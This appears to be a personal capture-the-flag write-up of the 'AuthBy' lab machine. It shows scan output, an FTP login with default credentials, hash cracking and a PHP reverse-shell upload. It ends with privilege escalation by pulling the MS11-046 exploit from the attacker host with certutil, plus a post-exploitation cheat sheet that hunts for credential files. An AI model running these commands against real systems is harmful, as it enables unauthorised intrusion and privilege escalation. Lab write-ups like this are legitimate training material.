**Metadata**

- IP Address:  192.168.148.46
- Hostname: LIVDA
- OS: Microsoft Windows Serverr 2008 Standard 6.0.6001 Service Pack 1 Build 6001
- Found Credentials/Users:

Main Objectives:

Local.txt = e184d853a5325c853c5cfcdf7e4bd1f3
Proof.txt = 9ccfaf4754615c92ce54ea929b64193d

**Enumeration**

1. NMAP Scans (TCP/UDP)

```
[+] Running: Nmap BASIC TCP (top 1000)
[+] Command: nmap -sS -Pn -n --top-ports 1000 -T4 --open 192.168.148.46 -oN - 
# Nmap 7.95 scan initiated Tue Feb 17 13:46:35 2026 as: nmap -sS -Pn -n --top-ports 1000 -T4 --open -oN - 192.168.148.46
Nmap scan report for 192.168.148.46
Host is up (0.073s latency).
Not shown: 998 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
21/tcp   open  ftp
3389/tcp open  ms-wbt-server

# Nmap done at Tue Feb 17 13:46:42 2026 -- 1 IP address (1 host up) scanned in 7.26 seconds
[+] Running: Nmap ALL TCP (all ports + versions)
[+] Command: nmap -sS -Pn -n -p- -T4 --open -sV --version-all 192.168.148.46 -oN /home/kali/ProvingGround/AuthBy/nmap/full_tcp.nmap -oG /home/kali/ProvingGround/AuthBy/nmap/full_tcp.gnmap 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-17 13:46 MST
Nmap scan report for 192.168.148.46
Host is up (0.073s latency).
Not shown: 65531 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE            VERSION
21/tcp   open  ftp                zFTPServer 6.0 build 2011-10-17
242/tcp  open  http               Apache httpd 2.2.21 ((Win32) PHP/5.3.8)
3145/tcp open  zftp-admin         zFTPServer admin
3389/tcp open  ssl/ms-wbt-server?


```

2. Interesting Ports/Services

```
21, 242, 3145, 3389
```

3. FTP Enumeration

```
FTP is accessible using anounymous login

Was not able to download or upload any files

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           zFTPServer 6.0 build 2011-10-17
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| total 9680
| ----------   1 root     root      5610496 Oct 18  2011 zFTPServer.exe
| ----------   1 root     root           25 Feb 10  2011 UninstallService.bat
| ----------   1 root     root      4284928 Oct 18  2011 Uninstall.exe
| ----------   1 root     root           17 Aug 13  2011 StopService.bat
| ----------   1 root     root           18 Aug 13  2011 StartService.bat
| ----------   1 root     root         8736 Nov 09  2011 Settings.ini
| dr-xr-xr-x   1 root     root          512 Feb 18 04:47 log
| ----------   1 root     root         2275 Aug 09  2011 LICENSE.htm
| ----------   1 root     root           23 Feb 10  2011 InstallService.bat
| dr-xr-xr-x   1 root     root          512 Nov 08  2011 extensions
| dr-xr-xr-x   1 root     root          512 Nov 08  2011 certificates
|_dr-xr-xr-x   1 root     root          512 Aug 02  2024 accounts

```

4. Web Enumeration 

```
242/tcp  open  http          Apache httpd 2.2.21 ((Win32) PHP/5.3.8)
|_http-server-header: Apache/2.2.21 (Win32) PHP/5.3.8
|_http-title: 401 Authorization Required
| http-auth: 
| HTTP/1.1 401 Authorization Required\x0D
|_  Basic realm=Qui e nuce nuculeum esse volt, frangit nucem!

Site Visit - Basic Auth when visited

whatweb -v http://192.168.

[+] Running: Gobuster BASIC (242) (exclude-length 401)
[+] Command: gobuster dir -u http://192.168.148.46:242 -w /usr/share/wordlists/dirb/common.txt -t 50 -o /home/kali/ProvingGround/AuthBy/gobuster/AuthBy_192.168.148.46_242_dir_basic.txt --exclude-length 401 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.148.46:242
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] Exclude Length:          401
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 211]
/.hta                 (Status: 403) [Size: 206]
/.htaccess            (Status: 403) [Size: 211]
/aux                  (Status: 403) [Size: 205]
/cgi-bin/             (Status: 403) [Size: 210]
/com1                 (Status: 403) [Size: 206]
/com2                 (Status: 403) [Size: 206]
/com3                 (Status: 403) [Size: 206]
/con                  (Status: 403) [Size: 205]
/lpt1                 (Status: 403) [Size: 206]
/lpt2                 (Status: 403) [Size: 206]
/nul                  (Status: 403) [Size: 205]
/phpmyadmin           (Status: 403) [Size: 212]
/prn                  (Status: 403) [Size: 205]
Progress: 4613 / 4613 (100.00%)
==============================

[+] Running: Gobuster ADVANCED (242) (exclude-length 401)
[+] Command: gobuster dir -u http://192.168.148.46:242 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -o /home/kali/ProvingGround/AuthBy/gobuster/AuthBy_192.168.148.46_242_dir_advanced.txt --exclude-length 401 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.148.46:242
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] Exclude Length:          401
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/# license, visit http://creativecommons.org/licenses/by-sa/3.0/ (Status: 403) [Size: 265]
/*checkout*           (Status: 403) [Size: 212]
/phpmyadmin           (Status: 403) [Size: 212]
/*docroot*            (Status: 403) [Size: 211]
/*                    (Status: 403) [Size: 203]
/con                  (Status: 403) [Size: 205]
/**http%3a            (Status: 403) [Size: 211]
/*http%3A             (Status: 403) [Size: 210]
/aux                  (Status: 403) [Size: 205]
/**http%3A            (Status: 403) [Size: 211]
/**http%3A%2F%2Fwww   (Status: 403) [Size: 220]
/devinmoore*          (Status: 403) [Size: 213]
/200109*              (Status: 403) [Size: 209]
/*sa_                 (Status: 403) [Size: 206]
/*dc_                 (Status: 403) [Size: 206]
Progress: 220551 / 220558 (100.00%)[ERROR] error on word 83326: timeout occurred during the request
[ERROR] error on word 110338: timeout occurred during the request
[ERROR] error on word weplab-0: timeout occurred during the request
[ERROR] error on word cm2006: timeout occurred during the request
Progress: 220558 / 220558 (100.00%)
===============================================================
Finished
===============================================================

[+] Running: Gobuster FILE search (242) (exclude-length 401)
[+] Command: gobuster dir -u http://192.168.148.46:242 -w /usr/share/wordlists/dirb/common.txt -x php\,asp\,aspx\,jsp\,html\,txt\,bak\,old\,zip\,tar\,tar.gz -t 50 -o /home/kali/ProvingGround/AuthBy/gobuster/AuthBy_192.168.148.46_242_files.txt --exclude-length 401 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.148.46:242
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] Exclude Length:          401
[+] User Agent:              gobuster/3.8
[+] Extensions:              zip,tar,asp,txt,old,tar.gz,php,aspx,jsp,html,bak
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 206]
/.hta.php             (Status: 403) [Size: 210]
/.hta.jsp             (Status: 403) [Size: 210]
/.hta.bak             (Status: 403) [Size: 210]
/.hta.html            (Status: 403) [Size: 211]
/.hta.aspx            (Status: 403) [Size: 211]
/.hta.zip             (Status: 403) [Size: 210]
/.hta.tar             (Status: 403) [Size: 210]
/.hta.asp             (Status: 403) [Size: 210]
/.hta.txt             (Status: 403) [Size: 210]
/.hta.tar.gz          (Status: 403) [Size: 213]
/.hta.old             (Status: 403) [Size: 210]
/.htaccess.old        (Status: 403) [Size: 215]
/.htaccess            (Status: 403) [Size: 211]
/.htaccess.txt        (Status: 403) [Size: 215]
/.htaccess.aspx       (Status: 403) [Size: 216]
/.htaccess.tar.gz     (Status: 403) [Size: 218]
/.htaccess.zip        (Status: 403) [Size: 215]
/.htaccess.jsp        (Status: 403) [Size: 215]
/.htaccess.html       (Status: 403) [Size: 216]
/.htaccess.php        (Status: 403) [Size: 215]
/.htaccess.bak        (Status: 403) [Size: 215]
/.htaccess.asp        (Status: 403) [Size: 215]
/.htaccess.tar        (Status: 403) [Size: 215]
/.htpasswd            (Status: 403) [Size: 211]
/.htpasswd.asp        (Status: 403) [Size: 215]
/.htpasswd.txt        (Status: 403) [Size: 215]
/.htpasswd.tar        (Status: 403) [Size: 215]
/.htpasswd.old        (Status: 403) [Size: 215]
/.htpasswd.tar.gz     (Status: 403) [Size: 218]
/.htpasswd.php        (Status: 403) [Size: 215]
/.htpasswd.aspx       (Status: 403) [Size: 216]
/.htpasswd.jsp        (Status: 403) [Size: 215]
/.htpasswd.html       (Status: 403) [Size: 216]
/.htpasswd.zip        (Status: 403) [Size: 215]
/.htpasswd.bak        (Status: 403) [Size: 215]
/aux                  (Status: 403) [Size: 205]
/aux.txt              (Status: 403) [Size: 209]
/aux.old              (Status: 403) [Size: 209]
/aux.tar.gz           (Status: 403) [Size: 212]
/aux.php              (Status: 403) [Size: 209]
/aux.aspx             (Status: 403) [Size: 210]
/aux.zip              (Status: 403) [Size: 209]
/aux.html             (Status: 403) [Size: 210]
/aux.jsp              (Status: 403) [Size: 209]
/aux.bak              (Status: 403) [Size: 209]
/aux.asp              (Status: 403) [Size: 209]
/aux.tar              (Status: 403) [Size: 209]
/cgi-bin/             (Status: 403) [Size: 210]
/cgi-bin/.html        (Status: 403) [Size: 215]
/com1.txt             (Status: 403) [Size: 210]
/com1                 (Status: 403) [Size: 206]
/com1.old             (Status: 403) [Size: 210]
/com1.tar.gz          (Status: 403) [Size: 213]
/com1.jsp             (Status: 403) [Size: 210]
/com1.aspx            (Status: 403) [Size: 211]
/com1.php             (Status: 403) [Size: 210]
/com1.html            (Status: 403) [Size: 211]
/com1.zip             (Status: 403) [Size: 210]
/com1.bak             (Status: 403) [Size: 210]
/com1.asp             (Status: 403) [Size: 210]
/com2                 (Status: 403) [Size: 206]
/com2.php             (Status: 403) [Size: 210]
/com1.tar             (Status: 403) [Size: 210]
/com2.bak             (Status: 403) [Size: 210]
/com2.jsp             (Status: 403) [Size: 210]
/com2.zip             (Status: 403) [Size: 210]
/com2.html            (Status: 403) [Size: 211]
/com2.aspx            (Status: 403) [Size: 211]
/com2.tar             (Status: 403) [Size: 210]
/com2.asp             (Status: 403) [Size: 210]
/com2.old             (Status: 403) [Size: 210]
/com2.txt             (Status: 403) [Size: 210]
/com3                 (Status: 403) [Size: 206]
/com2.tar.gz          (Status: 403) [Size: 213]
/com3.bak             (Status: 403) [Size: 210]
/com3.zip             (Status: 403) [Size: 210]
/com3.jsp             (Status: 403) [Size: 210]
/com3.html            (Status: 403) [Size: 211]
/com3.tar             (Status: 403) [Size: 210]
/com3.asp             (Status: 403) [Size: 210]
/com3.txt             (Status: 403) [Size: 210]
/com3.old             (Status: 403) [Size: 210]
/com3.tar.gz          (Status: 403) [Size: 213]
/com3.php             (Status: 403) [Size: 210]
/com3.aspx            (Status: 403) [Size: 211]
/con                  (Status: 403) [Size: 205]
/con.html             (Status: 403) [Size: 210]
/con.aspx             (Status: 403) [Size: 210]
/con.jsp              (Status: 403) [Size: 209]
/con.bak              (Status: 403) [Size: 209]
/con.zip              (Status: 403) [Size: 209]
/con.tar              (Status: 403) [Size: 209]
/con.asp              (Status: 403) [Size: 209]
/con.tar.gz           (Status: 403) [Size: 212]
/con.old              (Status: 403) [Size: 209]
/con.php              (Status: 403) [Size: 209]
/con.txt              (Status: 403) [Size: 209]
/lpt1                 (Status: 403) [Size: 206]
/lpt1.aspx            (Status: 403) [Size: 211]
/lpt1.php             (Status: 403) [Size: 210]
/lpt1.bak             (Status: 403) [Size: 210]
/lpt1.jsp             (Status: 403) [Size: 210]
/lpt1.html            (Status: 403) [Size: 211]
/lpt1.zip             (Status: 403) [Size: 210]
/lpt1.old             (Status: 403) [Size: 210]
/lpt1.tar             (Status: 403) [Size: 210]
/lpt1.tar.gz          (Status: 403) [Size: 213]
/lpt1.asp             (Status: 403) [Size: 210]
/lpt2                 (Status: 403) [Size: 206]
/lpt1.txt             (Status: 403) [Size: 210]
/lpt2.tar.gz          (Status: 403) [Size: 213]
/lpt2.php             (Status: 403) [Size: 210]
/lpt2.aspx            (Status: 403) [Size: 211]
/lpt2.jsp             (Status: 403) [Size: 210]
/lpt2.html            (Status: 403) [Size: 211]
/lpt2.bak             (Status: 403) [Size: 210]
/lpt2.tar             (Status: 403) [Size: 210]
/lpt2.zip             (Status: 403) [Size: 210]
/lpt2.asp             (Status: 403) [Size: 210]
/lpt2.txt             (Status: 403) [Size: 210]
/lpt2.old             (Status: 403) [Size: 210]
/nul.jsp              (Status: 403) [Size: 209]
/nul                  (Status: 403) [Size: 205]
/nul.html             (Status: 403) [Size: 210]
/nul.bak              (Status: 403) [Size: 209]
/nul.zip              (Status: 403) [Size: 209]
/nul.tar              (Status: 403) [Size: 209]
/nul.asp              (Status: 403) [Size: 209]
/nul.aspx             (Status: 403) [Size: 210]
/nul.tar.gz           (Status: 403) [Size: 212]
/nul.php              (Status: 403) [Size: 209]
/nul.txt              (Status: 403) [Size: 209]
/nul.old              (Status: 403) [Size: 209]
/phpmyadmin           (Status: 403) [Size: 212]
/prn.tar              (Status: 403) [Size: 209]
/prn                  (Status: 403) [Size: 205]
/prn.asp              (Status: 403) [Size: 209]
/prn.txt              (Status: 403) [Size: 209]
/prn.tar.gz           (Status: 403) [Size: 212]
/prn.old              (Status: 403) [Size: 209]
/prn.php              (Status: 403) [Size: 209]
/prn.html             (Status: 403) [Size: 210]
/prn.aspx             (Status: 403) [Size: 210]
/prn.jsp              (Status: 403) [Size: 209]
/prn.bak              (Status: 403) [Size: 209]
/prn.zip              (Status: 403) [Size: 209]
Progress: 55344 / 55356 (99.98%)[ERROR] error on word warn.bak: timeout occurred during the request
[ERROR] error on word way-board.old: timeout occurred during the request
[ERROR] error on word way-board.php: timeout occurred during the request
[ERROR] error on word wbboard.zip: timeout occurred during the request
[ERROR] error on word wbsadmin.zip: timeout occurred during the request
[ERROR] error on word wcs.zip: timeout occurred during the request
[ERROR] error on word wdav.asp: timeout occurred during the request
[ERROR] error on word web.config.bak: timeout occurred during the request
[ERROR] error on word web.config.tar: timeout occurred during the request
[ERROR] error on word web.config.asp: timeout occurred during the request
Progress: 55356 / 55356 (100.00%)
===============================================================
Finished

[+] Running: Gobuster LOWERCASE dir (242) (exclude-length 401)
[+] Command: gobuster dir -u http://192.168.148.46:242 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 50 -o /home/kali/ProvingGround/AuthBy/gobuster/AuthBy_192.168.148.46_242_dir_lowercase.txt --exclude-length 401 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.148.46:242
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] Exclude Length:          401
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/# license, visit http://creativecommons.org/licenses/by-sa/3.0/ (Status: 403) [Size: 265]
/*checkout*           (Status: 403) [Size: 212]
/phpmyadmin           (Status: 403) [Size: 212]
/*docroot*            (Status: 403) [Size: 211]
/*                    (Status: 403) [Size: 203]
/con                  (Status: 403) [Size: 205]
/**http%3a            (Status: 403) [Size: 211]
/*http%3a             (Status: 403) [Size: 210]
/aux                  (Status: 403) [Size: 205]
/**http%3a%2f%2fwww   (Status: 403) [Size: 220]
/devinmoore*          (Status: 403) [Size: 213]
/200109*              (Status: 403) [Size: 209]
/*sa_                 (Status: 403) [Size: 206]
/*dc_                 (Status: 403) [Size: 206]
Progress: 171416 / 207641 (82.55%)[ERROR] error on word fwmoni: timeout occurred during the request
Progress: 207638 / 207641 (100.00%)[ERROR] error on word t12690: timeout occurred during the request
[ERROR] error on word t126: timeout occurred during the request
[ERROR] error on word t1262: timeout occurred during the request
Progress: 207641 / 207641 (100.00%)
===============================================================
Finished

[+] Curl snapshots on HTTP ports: 242
[+] Running: Curl snapshot (242)
[+] Command: curl -k -L -sS -i --connect-timeout 5 --max-time 30 http://192.168.148.46:242 
HTTP/1.1 401 Authorization Required
Date: Tue, 17 Feb 2026 21:25:56 GMT
Server: Apache/2.2.21 (Win32) PHP/5.3.8
WWW-Authenticate: Basic realm="Qui e nuce nuculeum esse volt, frangit nucem!"
Content-Length: 401
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>401 Authorization Required</title>
</head><body>
<h1>Authorization Required</h1>
<p>This server could not verify that you
are authorized to access the document
requested.  Either you supplied the wrong
credentials (e.g., bad password), or your
browser doesn't understand how to supply
the credentials required.</p>
</body></html>

[+] Command: nikto -h http://192.168.148.46:242 -output /home/kali/ProvingGround/AuthBy/web/192.168.148.46_242/nikto.txt -Format txt 
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.148.46
+ Target Hostname:    192.168.148.46
+ Target Port:        242
+ Start Time:         2026-02-17 14:25:57 (GMT-7)
---------------------------------------------------------------------------
+ Server: Apache/2.2.21 (Win32) PHP/5.3.8
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ / - Requires Authentication for realm 'Qui e nuce nuculeum esse volt, frangit nucem!'
+ Apache/2.2.21 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ PHP/5.3.8 appears to be outdated (current is at least 8.1.5), PHP 7.4.28 for the 7.4 branch.
+ PHP/5.3 - PHP 3/4/5 and 7.0 are End of Life products without support.
+ /: Retrieved x-powered-by header: PHP/5.3.8.
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing

^[[1;5C+ 9059 requests: 0 error(s) and 8 item(s) reported on remote host
+ End Time:           2026-02-17 14:37:55 (GMT-7) (718 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested



```

7. Possible Exploits

```
Possible other FTP users given the information found in accounts directory when logged on as anonymous/anonymous.

total 4
dr-xr-xr-x   1 root     root          512 Aug 02  2024 backup
----------   1 root     root          764 Aug 02  2024 acc[Offsec].uac
----------   1 root     root         1036 Feb 18 06:22 acc[anonymous].uac
----------   1 root     root          930 Feb 18 08:06 acc[admin].uac
```

8. Other Notes

```

```

**Initial Foothold** 

1. Exploit Steps

- Logged into ftp server using admin/admin

![[Pasted image 20260217170759.png]]
- Downloaded and viewed .htaccess file.
![[Pasted image 20260219103740.png]]
- Cracked hash using hashcat.

```
hashcat -m 1600 hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule
```

![[Pasted image 20260219104001.png]]
- Tested that I could upload files

```
put text.txt
```

![[Pasted image 20260217170903.png]]

- Created reverse shell on revshells.com

![[Pasted image 20260217171014.png]]
- Uploaded reverse shell via the ftp connection.

```
put exploit.php
```
- Logged into website at http://192.168.148.46:242 using offsec/elite.

![[Pasted image 20260219104143.png]]
- Executed exploit by navigating to site. 

![[Pasted image 20260217171212.png]]

- Received reverse shell and found local.txt

![[Pasted image 20260217171332.png]]

2. Shell Access

```

```

**Post-Exploitation**

1. Shell / Context (reference)

```

# Powershell

powershell -NoP -NonI -W Hidden -Exec Bypass
set-alias wget Invoke-WebRequest
set-alias curl Invoke-WebRequest

```
  
2. Identity & System Info

```

C:\Users\apache\Documents>whoami
livda\apache

C:\Users\apache\Documents>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

C:\Users\apache\Documents>whoami /groups

GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Unknown SID type S-1-16-12288 Mandatory group, Enabled by default, Enabled group

C:\Users\apache\Documents>hostname
LIVDA

C:\Users\apache\Documents>systeminfo

Host Name:                 LIVDA
OS Name:                   Microsoftr Windows Serverr 2008 Standard 
OS Version:                6.0.6001 Service Pack 1 Build 6001
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                92573-OEM-7502905-27565
Original Install Date:     12/19/2009, 11:25:57 AM
System Boot Time:          2/19/2026, 9:29:15 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~3094 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 11/12/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (GMT-08:00) Pacific Time (US & Canada)
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,670 MB
Page File: Max Size:       1,985 MB
Page File: Available:      1,552 MB
Page File: In Use:         433 MB
Page File Location(s):     N/A
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           N/A

C:\Users\apache\Documents>ver

Microsoft Windows [Version 6.0.6001]


```

3. Environment

```

# Powershell

Get-ChildItem Env:
$env:Path
Get-ExecutionPolicy -List

```

  4. Users & Groups

```

# CMD

net user
net user <username>
net localgroup
net localgroup administrators
query us

  

# Powershell

Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember Administrators
whoami /all

```

  5.  AD Enumeration

```

# Powershell

Get-ADUser -Filter * (domain joined)
Get-ADGroup -Filter *
Get-ADGroupMember "Domain Admins"

```

  6. Privileges & Tokens

```

# CMD

whoami /priv
whoami /groups

```

  7. UAC & Policy Checks

```

# CMD

reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA

reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin

reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy

reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

```

  8. Processes & Services

```

# CMD

sc query
sc qc <service_name>
wmic service list brief
wmic service get name,displayname,pathname,startmode
tasklist
tasklist /v
tasklist /svc
wmic process list brief

  

# Powershell

Get-Service
Get-WmiObject Win32_Service | Select Name,StartMode,State,PathName
Get-Service | Where-Object {$_.Status -eq "Running"}
Get-Process
Get-Process -IncludeUserName
Get-WmiObject Win32_Process | Select Name,ProcessId,ExecutablePath

```

  9.  Scheduled Tasks

```

# CMD

schtasks /query /fo LIST /v

  

# Powershell

Get-ScheduledTask

```

  10.  Network

```

# CMD

ipconfig /all
arp -a
route print
netstat -ano
net use
net share
net session
nltest /domain_trusts
nltest /dsgetdc:<domain>

  

# Powershell

Get-NetIPConfiguration
Get-NetIPAddress
Get-NetRoute
Get-NetTCPConnection
Get-SmbShare
Get-SmbSession
Resolve-DnsName <hostname>

```

  11. Software

```

# CMD

wmic product get name,version
wmic product where "Vendor like '%Microsoft%'" get Name,Version
dir "C:\Program Files"
dir "C:\Program Files (x86)"

  

# Powershell

Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*

Get-ItemProperty HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*

Get-Package

```

  12. Shares & Drivers

```

# CMD

net share
driverquery /v

```

  13. Loot Files & Credentials

```

# CMD

dir C:\
dir C:\Users
dir C:\Users\<user>\Desktop
dir C:\Users\<user>\Documents
dir C:\Users\<user>\Downloads
dir C:\Users\<user>\AppData\Roaming
dir C:\Users\<user>\AppData\Local
dir C:\inetpub\wwwroot
dir C:\xampp
dir C:\wamp
dir /s /b *.txt *.ini *.cfg *.conf *.xml *.log *.bak *.ps1 *.kdbx *.rdp *.ppk *.pem

  

# Powershell

Get-ChildItem C:\Users -Recurse -Include *.txt,*.ini,*.cfg,*.xml,*.kdbx -ErrorAction SilentlyContinue

Get-ChildItem C:\ -Recurse -Include *pass*,*cred*,*secret* -ErrorAction SilentlyContinue

```

5. Automated Enumeration

```




```
5. Possible PE Paths

```
C:\Users\apache\Desktop>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

OS Name:                   Microsoftr Windows Serverr 2008 Standard 
OS Version:                6.0.6001 Service Pack 1 Build 6001

MS11-046

https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS11-046/README.md
```

**Privilege Escalation**

1. PE Steps

- Downloaded ms11-046 exploit from https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS11-046/README.md. 

- Copied exploit to victim server.

```
certutil -urlcache -f http://192.168.45.215/ms11-046.exe ms11-046.exe
```

- Ran exploit and switched user to nt autority\system.

![[Pasted image 20260219153007.png]]

```

2. Notes

```

```

